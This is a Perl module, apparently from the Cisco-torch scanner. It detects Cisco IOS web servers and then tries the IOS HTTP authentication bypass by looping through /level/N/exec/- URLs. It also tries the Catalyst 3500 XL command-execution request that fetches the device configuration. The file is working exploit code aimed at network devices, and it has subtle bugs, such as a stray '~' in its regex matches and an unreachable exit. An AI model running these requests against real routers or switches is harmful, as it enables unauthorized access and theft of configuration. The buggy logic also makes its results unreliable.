#*********************************************************************************
     
# Cisco IOS HTTP Auth Vulnerability";
sub cisco_auth_http
{
 
 log_print( "\n",                                     "h" );
	log_print( "Checking for webserver on port $port\n", "h" );
	log_print( "-----------------------------------\n",  "h" );
	my $sock = new IO::Socket::INET(
									 PeerAddr => $target,
									 PeerPort => '80',
									 Proto    => 'tcp',
									 Timeout  => '5'
	);
	if ($sock)
	{
		
		
			$sock->autoflush(1);
		
$sock->print("GET / HTTP/1.0\r\n");
$sock->print("User-Agent: Cisco-torch $version\r\n");
$sock->print("Host: $target\r\n");
$sock->print("Authorization: Basic $auth\r\n\r\n");
		
		sleep(2);
		sysread( $sock, $httpversion, 4096 );
	}
		close ($sock);
	
			if ( $httpversion =~ /cisco-IOS/ )
			{
				log_print( "Cisco-IOS Webserver found\n $httpversion \n\n", "c" );
				
		cisco_catoss_http();
			
		
	my $n = 16;
	while ( $n < 100 )
	{
	my $sock = new IO::Socket::INET(
									 PeerAddr => $target,
									 PeerPort => '80',
									 Proto    => 'tcp',
									 Timeout  => '3'
	);
	
		if ($sock)
		{
			print $sock "GET /level/".$n."/exec/- HTTP/1.0\r\n\r\n";
			sleep(2);
			sysread( $sock, $buff, 1000 );
			close ($sock);
			$n++;
			print "level: $n\n";
			if ( $buff =~ ~/http\/1\.0 200 ok/ )
			{
				log_print( "* Cisco IOS HTTP Auth Vulnerability \n\n", "c" );
				
				return (0);
				exit;
			}
			
		}
	}
			}
}
#****************************************************************************

#*********************************************************************************
# Cisco Catalyst 3500 XL Remote Arbitrary Command Vulnerability
sub cisco_catoss_http
{
	my $sock = new IO::Socket::INET(
									 PeerAddr => $target,
									 PeerPort => $port,
									 Proto    => 'tcp',
									 Timeout  => '5'
	);
	if ($sock)
	{
		print $sock "GET /exec/show/config/cr HTTP/1.0\n\n";
		sleep(3);
		sysread( $sock, $buff, 1000 );
		close($sock);
		
		if ( $buff =~ ~/http\/1\.0 200 ok/ )
		{
			log_print("*  Cisco Catalyst 3500 XL Remote Arbitrary Command Vulnerability\n\n",c);
		    return (1);
		}
		
		return (0);
	
		
	}
}



 1;
